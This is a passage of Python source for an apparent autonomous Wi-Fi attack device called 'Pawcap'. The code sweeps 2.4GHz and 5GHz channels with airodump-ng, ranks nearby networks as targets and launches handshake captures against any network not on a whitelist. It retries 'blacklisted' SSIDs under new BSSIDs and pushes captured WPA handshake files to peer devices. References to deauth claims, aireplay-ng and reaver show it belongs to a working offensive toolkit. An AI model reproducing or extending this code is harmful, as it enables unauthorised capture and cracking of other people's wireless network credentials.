        """Continuously scan 5GHz channels on wlan2 (capture_interface).
        
        Per aircrack-ng best practices: PAUSES scanning when a capture is active.
        Uses Popen instead of blocking subprocess.run so scans can be interrupted
        immediately when a capture starts.
        """
        # Non-DFS 5GHz channels (reliable, no radar)
        channels_5ghz_safe = [36, 40, 44, 48, 149, 153, 157, 161, 165]
        # DFS 5GHz channels (may have radar issues)
        channels_5ghz_dfs = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
        
        # Combine: prioritize safe channels, add DFS for thorough coverage
        channels_5ghz = channels_5ghz_safe + channels_5ghz_dfs
        
        while self.running:
            # Pause scanning while Find Friends mode is active
            if self._find_friends_mode:
                time.sleep(1)
                continue
            
            # Check if capture is active - if so, pause scanning
            if self._capture_active():
                time.sleep(1)
                continue
            
            # Pack mode: reorder channels to prioritize uncovered ones
            scan_channels = self._pack_reorder_channels(channels_5ghz)
            
            for channel in scan_channels:
                if not self.running:
                    return
                
                # Check again before each channel
                if self._capture_active():
                    break  # Exit channel loop, wait in outer loop
                
                # Set channel on 5GHz adapter (wlan2)
                try:
                    subprocess.run(
                        ['sudo', 'iw', 'dev', self.capture_interface, 'set', 'channel', str(channel)],
                        capture_output=True, timeout=2
                    )
                except:
                    pass
                
                # Bail immediately if capture started during channel set
                if self._capture_active():
                    break
                
                # Update current channel for UI
                self.current_5ghz_channel = channel
                
                # Quick scan this channel (interruptible — checks self.capturing)
                networks = self._quick_scan_channel_on_interface(channel, self.capture_interface)
                
                # Add to shared pool
                with self.parallel_lock:
                    for net in networks:
                        self.parallel_networks[net['bssid']] = net
                
                time.sleep(self.config['wifi']['channel_hop_interval'])
    
    def _quick_scan_channel_on_interface(self, channel, interface):
        """Quick scan of specific channel on specific interface using airodump-ng.
        
        Uses Popen + poll loop so it can be interrupted immediately when a capture
        starts on this interface (the 5GHz scan must yield to captures).
        """
        if self._find_friends_mode:
            return []
        networks = []
        scan_prefix = f'/tmp/pawcap_scan_{interface}'
        
        # Dwell longer on high-traffic channels for better client detection
        high_traffic = {1, 6, 11}
        dwell = 5 if channel in high_traffic else 3
        
        # Clean up any previous scan CSV files
        for f in globmod.glob(f'{scan_prefix}*.csv'):
            try:
                os.remove(f)
            except:
                pass
        
        proc = None
        try:
            cmd = [
                'sudo', 'airodump-ng',
                '--channel', str(channel),
                '--write', scan_prefix,
                '--output-format', 'pcap,csv',
                '--write-interval', '1',
                interface
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Poll every 0.5s so we can bail fast if a capture or find-friends starts
            deadline = time.time() + dwell
            while time.time() < deadline and self.running:
                if self._capture_active() or self._find_friends_mode:
                    # Capture or find-friends started — kill scan immediately and bail
                    try:
                        proc.terminate()
                        proc.wait(timeout=2)
                    except:
                        try:
                            proc.kill()
                        except:
                            pass
                    break
                if proc.poll() is not None:
                    break  # airodump exited on its own
                time.sleep(0.5)
            else:
                # Normal timeout — stop gracefully
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except:
                    try:
                        proc.kill()
                    except:
                        pass
            
            # Find the output file (airodump appends -01, -02, etc.)
            csv_files = sorted(globmod.glob(f'{scan_prefix}-*.csv'))
            if csv_files:
                networks = self._parse_airodump_csv(csv_files[-1])
            
            # Cleanup CSV files only
            for f in globmod.glob(f'{scan_prefix}-*.csv'):
                try:
                    os.remove(f)
                except:
                    pass
                    
        except:
            pass
        finally:
            # Ensure process is dead
            if proc and proc.poll() is None:
                try:
                    proc.kill()
                except:
                    pass
        
        return networks
    
    def _scan_loop(self):
        """Main scanning loop with adaptive band selection.
        
        Smart targeting strategy:
          1. Always sweep 2.4GHz first (channels 1-11, ~22s)
          2. Evaluate candidates - if a good target exists (score >= threshold), take it
          3. If no good 2.4GHz targets, escalate to 5GHz non-DFS channels (36-48, 149-165)
          4. If still nothing, scan 5GHz DFS channels (52-144) as a last resort
          
        This keeps sweep times fast when easy targets exist, but Pawcap can
        dig deeper into 5GHz when the 2.4GHz landscape is dry.
        """
        channels_24ghz = list(range(1, 12))
        # Non-DFS 5GHz: UNII-1 and UNII-3 (safe, no radar issues)
        channels_5ghz_safe = [36, 40, 44, 48, 149, 153, 157, 161, 165]
        # DFS 5GHz: UNII-2 and UNII-2 Extended (radar detection, can be flaky)
        channels_5ghz_dfs = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 
                            124, 128, 132, 136, 140, 144]
        
        # Minimum score to accept a target from 2.4GHz without escalating
        GOOD_TARGET_THRESHOLD = 30
        
        # Track which band/phase we're in
        PHASE_24GHZ = '2.4GHz'
        PHASE_5GHZ_SAFE = '5GHz'
        PHASE_5GHZ_DFS = '5GHz-DFS'
        
        while self.running:
            try:
                # Pause scanning while Find Friends mode is active
                if self._find_friends_mode:
                    time.sleep(1)
                    continue
                
                # Periodic memory cleanup
                self._cleanup_memory()
                
                # Check if a capture is active (single-adapter: pause scanning)
                if not self.dual_mode:
                    with self.capture_lock:
                        active_captures = len(self.capturing)
                    if active_captures > 0:
                        time.sleep(2)
                        continue
                
                # --- Organic break: device's natural behavior ---
                if self.organic_mode and self.running:
                    self._organic_break()
                
                if not self.running:
                    break
                
                # --- Phase 1: 2.4GHz sweep (always) ---
                self.channel_networks.clear()
                if self.smart_targeting:
                    self.candidates.clear()
                self.stats['scan_phase'] = PHASE_24GHZ
                
                self._sweep_channels(self._pack_reorder_channels(channels_24ghz))
                
                if not self.running:
                    break
                
                # Check if capture started during sweep (single-adapter only)
                if not self.dual_mode:
                    with self.capture_lock:
                        if len(self.capturing) > 0:
                            continue
                
                if self.smart_targeting:
                    # Evaluate 2.4GHz candidates
                    best_score = max((c['score'] for c in self.candidates.values()), default=0)
                    
                    if best_score >= GOOD_TARGET_THRESHOLD:
                        target = self._select_best_target()
                        if target:
                            self._log_activity('INFO', f"Good 2.4GHz target found (score {best_score})")
                            self._initiate_capture(target)
                            continue
                    else:
                        num_24 = len(self.candidates)
                        if num_24 > 0:
                            self._log_activity('INFO', 
                                f"2.4GHz sweep: {num_24} candidates, best score {best_score} "
                                f"(below threshold {GOOD_TARGET_THRESHOLD}) - expanding to 5GHz")
                        else:
                            self._log_activity('INFO', 
                                "2.4GHz sweep: no candidates - expanding to 5GHz")
                    
                    # --- Phase 2: 5GHz safe channels ---
                    self.stats['scan_phase'] = PHASE_5GHZ_SAFE
                    self._sweep_channels(self._pack_reorder_channels(channels_5ghz_safe))
                    
                    if not self.running:
                        break
                    
                    if not self.dual_mode:
                        with self.capture_lock:
                            if len(self.capturing) > 0:
                                continue
                    
                    # Re-evaluate with 5GHz candidates added
                    best_score = max((c['score'] for c in self.candidates.values()), default=0)
                    
                    if best_score >= GOOD_TARGET_THRESHOLD:
                        target = self._select_best_target()
                        if target:
                            band = '5GHz' if int(target.get('channel', 0)) > 14 else '2.4GHz'
                            self._log_activity('INFO', f"Target found on {band} (score {best_score})")
                            self._initiate_capture(target)
                            continue
                    
                    # --- Phase 3: 5GHz DFS channels (last resort) ---
                    self.stats['scan_phase'] = PHASE_5GHZ_DFS
                    self._log_activity('INFO', "No good targets yet - scanning DFS channels")
                    self._sweep_channels(self._pack_reorder_channels(channels_5ghz_dfs))
                    
                    if not self.running:
                        break
                    
                    if not self.dual_mode:
                        with self.capture_lock:
                            if len(self.capturing) > 0:
                                continue
                    
                    # Final evaluation - take the best of everything
                    target = self._select_best_target()
                    if target:
                        band = '5GHz' if int(target.get('channel', 0)) > 14 else '2.4GHz'
                        self._log_activity('INFO', f"DFS sweep complete - targeting on {band}")
                        self._initiate_capture(target)
                    else:
                        self._log_activity('INFO', "Full sweep complete - no viable targets this round")
                    
                    self.stats['targets_queued'] = len(self.candidates)
                
                # --- Retrace phase: check blacklisted SSIDs on 5GHz ---
                if self.running:
                    retrace_ssids = self._get_retrace_ssids()
                    if retrace_ssids:
                        self._retrace_5ghz_sweep(retrace_ssids)
                
            except Exception as e:
                self._log_activity('ERROR', f"Error in scan loop: {e}")
                time.sleep(2)

    def _get_retrace_ssids(self):
        """Find blacklisted SSIDs that haven't been checked on 5GHz yet.
        These deserve a 5GHz retrace before being permanently written off.
        Includes networks with empty attempted_bands (pre-tracking data)."""
        retrace = set()
        for bssid, k in self.network_knowledge.items():
            if k.get('consecutive_failures', 0) < 5:
                continue
            bands = (k.get('attempted_bands', '') or '').split(',')
            bands = [b for b in bands if b]
            if '5' in bands:
                continue  # Already checked on 5GHz
            ssid = k.get('ssid', '')
            if ssid and ssid not in self.whitelist:
                retrace.add(ssid)
        return retrace

    def _retrace_5ghz_sweep(self, retrace_ssids):
        """Perform a targeted 5GHz sweep looking for alternate BSSIDs of
        blacklisted SSIDs that were only attempted on 2.4GHz.
        
        Dual-band APs typically use different BSSIDs per band, so a 5GHz
        scan may discover new BSSIDs for the same SSID that are worth trying.
        """
        if not retrace_ssids:
            return

        channels_5ghz = [36, 40, 44, 48, 149, 153, 157, 161, 165]
        
        self._log_activity('INFO',
            f"Retrace: scanning 5GHz for {len(retrace_ssids)} blacklisted SSID(s): "
            f"{', '.join(list(retrace_ssids)[:5])}")
        self.stats['scan_phase'] = '5GHz-retrace'

        found_new = 0
        for channel in channels_5ghz:
            if not self.running:
                return

            if not self.dual_mode:
                with self.capture_lock:
                    if len(self.capturing) > 0:
                        return

            self._set_channel(channel)
            self.stats['channel'] = channel

            networks = self._quick_scan_channel(channel)

            for net in networks:
                bssid = net['bssid']
                ssid = net['ssid']
                # Check BEFORE processing if this is a new 5GHz BSSID for a retrace SSID
                is_new_bssid = (ssid in retrace_ssids and bssid not in self.network_knowledge)
                is_non_blacklisted = False
                if not is_new_bssid and ssid in retrace_ssids and bssid in self.network_knowledge:
                    is_non_blacklisted = self.network_knowledge[bssid].get('consecutive_failures', 0) < 5
                # Process all networks normally (updates tracking + scoring)
                self._process_network(net)
                if is_new_bssid or is_non_blacklisted:
                    found_new += 1

            time.sleep(self.config['wifi']['channel_hop_interval'])

        self._flush_knowledge()
        self._check_passive_handshakes()

        # Mark the original 2.4GHz BSSIDs as having been retrace-checked
        # so we don't retrace them again every loop
        for bssid, k in self.network_knowledge.items():
            if k.get('ssid', '') in retrace_ssids:
                bands = (k.get('attempted_bands', '') or '').split(',')
                bands = [b for b in bands if b]
                if '5' not in bands:
                    # Mark as 5GHz checked even though the original BSSID
                    # may not exist on 5GHz — we scanned for it
                    self._update_attempted_band(bssid, 36)  # 36 is a 5GHz channel

        if found_new > 0:
            self._log_activity('SUCCESS',
                f"Retrace found {found_new} new 5GHz target(s) for blacklisted SSIDs!")
            # Try to capture the best retrace discovery immediately
            if self.smart_targeting:
                target = self._select_best_target()
                if target:
                    band = '5GHz' if int(target.get('channel', 0)) > 14 else '2.4GHz'
                    self._log_activity('INFO', f"Retrace target: {target['ssid']} on {band}")
                    self._initiate_capture(target)
        else:
            self._log_activity('INFO',
                "Retrace complete — no new 5GHz BSSIDs found for blacklisted SSIDs")

    def _get_lan_ip(self):
        """Get our LAN IP address for pack HTTP communication."""
        try:
            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=2)
            lan_prefix = self.config['device']['lan_network'].split('/')[0].rsplit('.', 1)[0]
            for ip in result.stdout.strip().split():
                if ip.startswith(lan_prefix):
                    return ip
        except:
            pass
        return None

    # --- Social beacon constants ---
    PAWCAP_BEACON_BSSID = 'fa:ce:1d:09:00:00'
    PWNAGOTCHI_BEACON_BSSID = 'de:ad:be:ef:de:ad'
    PAWCAP_IE_ID = 222
    SOCIAL_BEACON_INTERVAL = 30

    # --- Organic mode: naturalistic dog behavior breaks ---
    ORGANIC_ACTIONS = [
        ('dig',       'U▼・ᴥ・▼U', 'Digging for buried treasure'),
        ('scratch',   'U~・ᴥ・~U',  'Scratching that itch'),
        ('sniff',     'U´◕ᴥ◕`U',  'Sniffing everything'),
        ('roll_over', 'U⌒ᴥ⌒U',    'Rolling in something smelly'),
        ('fetch',     'U´•ᴥ•`∪',  'Watch me catch some sick air!'),
        ('hop_fence', 'Uˆ・ᴥ・ˆU', 'Hopping to greener pastures'),
        ('socialize', 'U♥ᴥ♥U',    'Looking for friends'),
    ]

    def _organic_break(self):
        """Device takes a naturalistic break between scan cycles.
        ~35% chance of triggering per cycle. Sequence:
        Stop -> Stretch -> Listen -> Random dog action -> Decide
        """
        if random.random() > 0.35:
            return

        # Stop
        self.organic_action = ('stopping', 'U・ᴥ・U', 'Stopping for a moment...')
        self._log_activity('INFO', f'{self.device_name} stops and looks around...')
        self.stats['scan_phase'] = 'organic'
        time.sleep(2)
        if not self.running:
            self.organic_action = None
            return

        # Stretch
        self.organic_action = ('stretching', 'U^・ᴥ・^U', 'Stretching...')
        self._log_activity('INFO', f'{self.device_name} stretches...')
        time.sleep(1)
        if not self.running:
            self.organic_action = None
            return

        # Listen — extended passive dwell on a random channel
        listen_channel = random.choice([1, 6, 11, 36, 44, 149, 157])
        self.organic_action = ('listening', 'U`◕ᴥ◕´U', f'Listening on channel {listen_channel}...')
        self._log_activity('INFO', f'{self.device_name} listens carefully on channel {listen_channel}...')
        self._set_channel(listen_channel)
        self.stats['channel'] = listen_channel
        self._extended_listen(listen_channel, duration=5)
        if not self.running:
            self.organic_action = None
            return

        # Random dog action - filter out socialize if social mode is disabled
        available_actions = self.ORGANIC_ACTIONS
        if not self.social_mode:
            available_actions = [a for a in self.ORGANIC_ACTIONS if a[0] != 'socialize']
        
        action = random.choice(available_actions)
        action_name, action_face, action_msg = action
        self.organic_action = action

        if action_name == 'dig':
            self._organic_dig()
        elif action_name == 'scratch':
            self._organic_scratch()
        elif action_name == 'sniff':
            self._organic_sniff()
        elif action_name == 'roll_over':
            self._organic_roll_over()
        elif action_name == 'fetch':
            self._organic_fetch()
        elif action_name == 'hop_fence':
            self._organic_hop_fence()
        elif action_name == 'socialize':
            self._organic_socialize()

        if not self.running:
            self.organic_action = None
            return

        # Decide
        self.organic_action = ('deciding', 'U´•ᴥ•`U', 'Deciding next move...')
        self._log_activity('INFO', f'{self.device_name} decides what to do next...')
        time.sleep(1)
        self.organic_action = None

    def _extended_listen(self, channel, duration=5):
        """Extended passive dwell on a channel — like _quick_scan_channel but longer.
        Captures pcap for background handshake checking and processes networks found."""
        scan_prefix = '/tmp/pawcap_scan'

        for f in globmod.glob(f'{scan_prefix}*.csv'):
            try:
                os.remove(f)
            except:
                pass

        try:
            cmd = [
                'sudo', 'timeout', str(duration),
                'airodump-ng',
                '--channel', str(channel),
                '--write', scan_prefix,
                '--output-format', 'pcap,csv',
                '--write-interval', '1',
                self.scan_interface
            ]
            subprocess.run(cmd, capture_output=True, timeout=duration + 3)

            csv_files = sorted(globmod.glob(f'{scan_prefix}-*.csv'))
            if csv_files:
                networks = self._parse_airodump_csv(csv_files[-1])
                for net in networks:
                    self._process_network(net)

            for f in globmod.glob(f'{scan_prefix}-*.csv'):
                try:
                    os.remove(f)
                except:
                    pass
        except:
            pass

    def _organic_dig(self):
        """Dig: deep scan on the channel with the most seen networks."""
        # Find the busiest channel
        if self.channel_networks:
            best_ch = max(self.channel_networks, key=self.channel_networks.get)
        else:
            best_ch = random.choice([1, 6, 11, 36, 149])

        self.organic_action = ('dig', 'U▼・ᴥ・▼U', f'Digging into channel {best_ch}...')
        self._log_activity('INFO', f'{self.device_name} digs deep on channel {best_ch}...')
        self._set_channel(int(best_ch))
        self.stats['channel'] = int(best_ch)
        self._extended_listen(int(best_ch), duration=10)

    def _organic_scratch(self):
        """Scratch: re-evaluate known networks, log any score changes.
        Throttled: only logs full report every 10 minutes."""
        if not hasattr(self, '_last_scratch_report'):
            self._last_scratch_report = 0
        
        now = time.time()
        # Only log the full network report every 10 minutes
        if now - self._last_scratch_report < 600:
            self._log_activity('INFO', f'{self.device_name} scratches and reassesses known networks...')
            time.sleep(2)
            return
        
        self._last_scratch_report = now
        self._log_activity('INFO', f'{self.device_name} scratches and reassesses known networks...')
        reviewed = 0
        for bssid, k in list(self.network_knowledge.items())[:20]:
            consec = k.get('consecutive_failures', 0)
            reason = k.get('last_failure_reason', '')
            ssid = k.get('ssid', '???')
            if consec > 0:
                reviewed += 1
                if consec >= 5:
                    self._log_activity('INFO', f'  {ssid}: blacklisted ({consec} fails, {reason})')
                elif consec >= 2:
                    self._log_activity('INFO', f'  {ssid}: struggling ({consec} fails, {reason})')
        if reviewed == 0:
            self._log_activity('INFO', '  No troubled networks to review')
        time.sleep(2)

    def _organic_sniff(self):
        """Sniff around: hop through 3-5 random channels listening briefly."""
        all_channels = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161]
        hop_count = random.randint(3, 5)
        channels = random.sample(all_channels, min(hop_count, len(all_channels)))

        self._log_activity('INFO', f'{self.device_name} sniffs around channels: {channels}')
        for ch in channels:
            if not self.running:
                return
            self.organic_action = ('sniff', 'U´◕ᴥ◕`U', f'Sniffing channel {ch}...')
            self._set_channel(ch)
            self.stats['channel'] = ch
            networks = self._quick_scan_channel(ch)
            for net in networks:
                self._process_network(net)
            time.sleep(0.5)

    def _organic_roll_over(self):
        """Roll over: pick a random low-scoring candidate and highlight it as a wild card."""
        self._log_activity('INFO', f'{self.device_name} rolls over and shuffles priorities...')

        # Look for networks with moderate failures (not blacklisted, but struggling)
        underdogs = [
            (bssid, k) for bssid, k in self.network_knowledge.items()
            if 1 <= k.get('consecutive_failures', 0) <= 4
            and k.get('ssid', '') not in self.whitelist
        ]
        if underdogs:
            bssid, k = random.choice(underdogs)
            ssid = k.get('ssid', '???')
            self._log_activity('INFO', f'  Wild card pick: {ssid} ({bssid}) — giving it another look')
        else:
            self._log_activity('INFO', '  No underdogs to champion right now')
        time.sleep(2)

    def _organic_fetch(self):
        """Fetch: revisit a previously-seen network that hasn't been seen recently."""
        now = time.time()

        # Find networks not seen in the last 10 minutes
        stale = [
            (bssid, data) for bssid, data in self.seen_networks.items()
            if now - data.get('last_seen_ts', now) > 600
        ]
        if not stale:
            self._log_activity('INFO', f'{self.device_name} fetches... but everything is fresh nearby')
            time.sleep(2)
            return

        bssid, data = random.choice(stale)
        ssid = data.get('ssid', '???')
        channel = data.get('channel', 6)

        self.organic_action = ('fetch', 'U´•ᴥ•`∪', f'Fetching {ssid} on ch {channel}...')
        self._log_activity('INFO', f'{self.device_name} goes back to check on {ssid} (ch {channel})...')
        self._set_channel(int(channel))
        self.stats['channel'] = int(channel)
        networks = self._quick_scan_channel(int(channel))
        found = False
        for net in networks:
            self._process_network(net)
            if net['bssid'] == bssid:
                found = True
        if found:
            self._log_activity('INFO', f'  {ssid} is still there!')
        else:
            self._log_activity('INFO', f'  {ssid} has gone quiet')

    def _organic_hop_fence(self):
        """Hop the fence: jump to the opposite band and scan a few channels there."""
        current_ch = self.stats.get('channel', 1)
        on_5ghz = int(current_ch) > 14 if current_ch else False

        if on_5ghz:
            # Currently on 5GHz — hop to 2.4GHz
            target_band = '2.4GHz'
            channels = random.sample([1, 3, 6, 9, 11], 3)
        else:
            # Currently on 2.4GHz — hop to 5GHz
            target_band = '5GHz'
            channels = random.sample([36, 40, 44, 48, 149, 153, 157, 161], 3)

        self.organic_action = ('hop_fence', 'Uˆ・ᴥ・ˆU', f'Hopping the fence to {target_band}...')
        self._log_activity('INFO', f'{self.device_name} hops the fence to {target_band}! Channels: {channels}')

        found = 0
        for ch in channels:
            if not self.running:
                return
            self.organic_action = ('hop_fence', 'Uˆ・ᴥ・ˆU', f'Exploring {target_band} ch {ch}...')
            self._set_channel(ch)
            self.stats['channel'] = ch
            networks = self._quick_scan_channel(ch)
            for net in networks:
                self._process_network(net)
                found += 1
            time.sleep(0.5)

        if found > 0:
            self._log_activity('INFO', f'  Found {found} network(s) on the other side of the fence!')
        else:
            self._log_activity('INFO', f'  Quiet over on {target_band}...')

    # --- Social mode: property for runtime toggle ---
    @property
    def social_mode(self):
        return self._social_mode

    @social_mode.setter
    def social_mode(self, enabled):
        self._social_mode = enabled
        if enabled and self._social_thread is None and SCAPY_AVAILABLE:
            self._social_thread = threading.Thread(target=self._social_worker, daemon=True)
            self._social_thread.start()
            self._log_activity('INFO', 'Social mode enabled — looking for friends!')
        elif not enabled:
            self._log_activity('INFO', 'Social mode disabled')

    # --- Find Friends mode: rapid channel hopping to discover peers ---
    @property
    def find_friends_mode(self):
        return self._find_friends_mode

    @find_friends_mode.setter
    def find_friends_mode(self, enabled):
        self._find_friends_mode = enabled
        if enabled and self._find_friends_thread is None and SCAPY_AVAILABLE:
            # Auto-enable social mode (needed for beacons)
            if not self._social_mode:
                self.social_mode = True
            # Kill all scanning, capture, and deauth processes
            for proc_name in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver']:
                try:
                    subprocess.run(['sudo', 'pkill', '-f', proc_name], capture_output=True, timeout=3)
                except:
                    pass
            # Clear active captures so scan loops don't stay blocked
            with self.capture_lock:
                self.capturing.clear()
            self._find_friends_thread = threading.Thread(target=self._find_friends_worker, daemon=True)
            self._find_friends_thread.start()
            self._log_activity('INFO', 'Find Friends mode enabled — scanning stopped, searching for pack!')
        elif not enabled:
            self._log_activity('INFO', 'Find Friends mode disabled — resuming scanning')

    FIND_FRIENDS_CHANNELS = [1, 6, 11, 36, 149]

    def _find_friends_worker(self):
        """Rapid channel hopping to find nearby Pawcaps.
        Hops through key channels broadcasting and sniffing with short dwell times."""
        self._log_activity('INFO', 'Find Friends worker started')
        while self._find_friends_mode and self.running:
            try:
                for channel in self.FIND_FRIENDS_CHANNELS:
                    if not self._find_friends_mode or not self.running:
                        break
                    # Set channel on scan interface
                    try:
                        subprocess.run(
                            ['sudo', 'iw', 'dev', self.scan_interface, 'set', 'channel', str(channel)],
                            capture_output=True, timeout=2
                        )
                    except:
                        pass
                    self.stats['channel'] = channel
                    self.stats['scan_phase'] = 'find_friends'
                    self._log_activity('DEBUG', f'Find Friends: searching on channel {channel}...')
                    # Broadcast our beacon
                    self._social_broadcast()
                    # Sniff for 3 seconds (longer dwell = better chance of overlap)
                    self._social_sniff(timeout=3)
                    # Broadcast again at end of dwell window
                    self._social_broadcast()
            except Exception as e:
                self._log_activity('WARN', f'Find Friends worker error: {e}')
                time.sleep(2)
        self._find_friends_thread = None
        self._log_activity('INFO', 'Find Friends worker stopped')

    # --- Pack mode: coordinate channel scanning with nearby Pawcaps ---
    @property
    def pack_mode(self):
        return self._pack_mode

    @pack_mode.setter
    def pack_mode(self, enabled):
        self._pack_mode = enabled
        if enabled:
            # Auto-enable social mode (needed for beacon communication)
            if not self._social_mode:
                self.social_mode = True
            # Start pack comms worker for HTTP-based coordination
            if self._pack_comms_thread is None:
                self._pack_comms_thread = threading.Thread(target=self._pack_comms_worker, daemon=True)
                self._pack_comms_thread.start()
            self._log_activity('INFO', 'Pack mode enabled — coordinating with nearby Pawcaps!')
        else:
            self._pack_peers.clear()
            self._deauth_claims.clear()
            self._log_activity('INFO', 'Pack mode disabled')

    def _pack_reorder_channels(self, channels):
        """Reorder channel list to prioritize channels not covered by pack peers.
        Uses HTTP-synced scan_state (more reliable) with beacon fallback."""
        if not self._pack_mode or not self._pack_peers:
            return channels

        # Prune stale peers (>120s with no beacon AND no HTTP)
        now = time.time()
        stale = [name for name, info in self._pack_peers.items()
                 if now - info.get('last_seen', 0) > 120 and not info.get('http_reachable')]
        for name in stale:
            del self._pack_peers[name]

        if not self._pack_peers:
            return channels

        # Collect channels covered by peers — prefer HTTP-synced state
        covered = set()
        for info in self._pack_peers.values():
            scan_state = info.get('scan_state', {})
            if scan_state.get('channel'):
                covered.add(scan_state['channel'])
            else:
                covered.update(info.get('channels', []))

        # Sort: uncovered first, covered last
        uncovered = [ch for ch in channels if ch not in covered]
        covered_list = [ch for ch in channels if ch in covered]
        return uncovered + covered_list

    def _get_pack_scan_state(self):
        """Get our current scan state for pack sync."""
        capturing_bssid = None
        with self.capture_lock:
            if self.capturing:
                capturing_bssid = list(self.capturing.keys())[0]
        return {
            'phase': self.stats.get('scan_phase', ''),
            'channel': self.stats.get('channel', 0),
            'capturing': capturing_bssid,
            'candidates': len(self.candidates)
        }

    def _get_deauth_claims(self):
        """Get active deauth claims (prune expired >60s)."""
        now = time.time()
        self._deauth_claims = {b: t for b, t in self._deauth_claims.items() if now - t < 60}
        return dict(self._deauth_claims)

    def _get_handshake_bssids(self):
        """Get list of BSSIDs we have handshakes for."""
        if self.db and hasattr(self.db, 'get_all_handshakes'):
            try:
                return [h['bssid'] for h in self.db.get_all_handshakes()]
            except:
                pass
        return []

    def _pack_comms_worker(self):
        """Background thread: periodic HTTP sync with pack peers."""
        import urllib.request
        import urllib.error
        self._log_activity('INFO', 'Pack comms worker started')
        while self._pack_mode and self.running:
            try:
                peers = dict(self._pack_peers)
                for peer_name, peer_info in peers.items():
                    if not self._pack_mode or not self.running:
                        break
                    lan_ip = peer_info.get('lan_ip')
                    if not lan_ip:
                        continue
                    web_port = peer_info.get('web_port', 8080)
                    url = f'http://{lan_ip}:{web_port}/api/pack/sync'
                    our_state = {
                        'device_name': self.config['device'].get('name', 'Pawcap'),
                        'scan_state': self._get_pack_scan_state(),
                        'handshake_bssids': self._get_handshake_bssids(),
                        'deauth_claims': self._get_deauth_claims()
                    }
                    try:
                        payload = json.dumps(our_state).encode()
                        req = urllib.request.Request(
                            url, data=payload,
                            headers={'Content-Type': 'application/json'},
                            method='POST'
                        )
                        with urllib.request.urlopen(req, timeout=5) as resp:
                            resp_data = json.loads(resp.read().decode())
                        # Update peer with HTTP-synced data
                        if peer_name in self._pack_peers:
                            self._pack_peers[peer_name]['scan_state'] = resp_data.get('scan_state', {})
                            self._pack_peers[peer_name]['handshake_bssids'] = resp_data.get('handshake_bssids', [])
                            self._pack_peers[peer_name]['deauth_claims'] = resp_data.get('deauth_claims', {})
                            self._pack_peers[peer_name]['http_reachable'] = True
                        self._log_activity('DEBUG', f'Pack sync with {peer_name} OK')
                    except Exception as e:
                        if peer_name in self._pack_peers:
                            self._pack_peers[peer_name]['http_reachable'] = False
                        self._log_activity('DEBUG', f'Pack sync with {peer_name} failed: {e}')

                # Push missing handshakes to reachable peers
                for peer_name, peer_info in dict(self._pack_peers).items():
                    if not self._pack_mode or not self.running:
                        break
                    if peer_info.get('http_reachable'):
                        try:
                            self._pack_push_missing_handshakes(peer_name, peer_info)
                        except Exception as e:
                            self._log_activity('DEBUG', f'Pack handshake push to {peer_name} failed: {e}')

                # Prune peers with no beacon AND no HTTP for >120s
                now = time.time()
                stale = [name for name, info in self._pack_peers.items()
                         if now - info.get('last_seen', 0) > 120 and not info.get('http_reachable')]
                for name in stale:
                    del self._pack_peers[name]
                    self._log_activity('INFO', f'Pack peer {name} pruned (stale)')

            except Exception as e:
                self._log_activity('WARN', f'Pack comms worker error: {e}')

            # Sleep 10s in 1s increments for responsiveness
            for _ in range(10):
                if not self._pack_mode or not self.running:
                    break
                time.sleep(1)

        self._pack_comms_thread = None
        self._log_activity('INFO', 'Pack comms worker stopped')

    def _pack_push_missing_handshakes(self, peer_name, peer_info):
        """Push handshake files the peer doesn't have (max 3 per cycle)."""
        import urllib.request
        peer_bssids = set(peer_info.get('handshake_bssids', []))
        our_bssids = self._get_handshake_bssids()
        missing = [b for b in our_bssids if b not in peer_bssids]
        if not missing:
            return

        lan_ip = peer_info.get('lan_ip')
        web_port = peer_info.get('web_port', 8080)
        dest_dir = self.config['capture']['handshake_dir']

        for bssid in missing[:3]:
            # Find the capture file for this BSSID
            if not self.db:
                continue
            handshakes = self.db.get_all_handshakes()
            hs_entry = next((h for h in handshakes if h['bssid'] == bssid), None)
            if not hs_entry:
                continue

            capture_file = hs_entry.get('capture_file', '')
            # Try the handshake_dir for the actual file
            if not os.path.isfile(capture_file):
                # Check handshake_dir for files matching this BSSID
                safe_bssid = bssid.replace(':', '')
                matches = globmod.glob(os.path.join(dest_dir, f'*{safe_bssid}*'))
                if matches:
                    capture_file = matches[0]
                else:
                    continue

            if not os.path.isfile(capture_file):
                continue

            try:
                self._pack_send_handshake_file(
                    lan_ip, web_port, bssid,
                    hs_entry.get('ssid', 'Unknown'),
                    hs_entry.get('channel'),
                    capture_file
                )
                self._log_activity('INFO', f'Pack: pushed handshake {bssid} to {peer_name}')
            except Exception as e:
                self._log_activity('DEBUG', f'Pack: failed to push {bssid} to {peer_name}: {e}')

    def _pack_send_handshake_file(self, lan_ip, web_port, bssid, ssid, channel, capture_file):
        """Send a handshake capture file to a pack peer via multipart POST."""
        import urllib.request
        url = f'http://{lan_ip}:{web_port}/api/pack/handshake'
        boundary = f'----PawcapPack{int(time.time()*1000)}'

        metadata = json.dumps({'bssid': bssid, 'ssid': ssid, 'channel': channel})
        with open(capture_file, 'rb') as f:
            file_data = f.read()
        filename = os.path.basename(capture_file)

        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="metadata"\r\n'
            f'Content-Type: application/json\r\n\r\n'
            f'{metadata}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="capture"; filename="{filename}"\r\n'
            f'Content-Type: application/octet-stream\r\n\r\n'
        ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()

        req = urllib.request.Request(
            url, data=body,
            headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())

    def _pack_notify_handshake(self, bssid, ssid, capture_file, channel):
        """Fire-and-forget: immediately push a new handshake to all reachable pack peers."""
        if not self._pack_mode:
            return
        peers = [(name, info) for name, info in self._pack_peers.items()
                 if info.get('http_reachable') and info.get('lan_ip')]
        if not peers:
            return

        def _push():
            for peer_name, peer_info in peers:
                try:
                    self._pack_send_handshake_file(
                        peer_info['lan_ip'], peer_info.get('web_port', 8080),
                        bssid, ssid, channel, capture_file
                    )
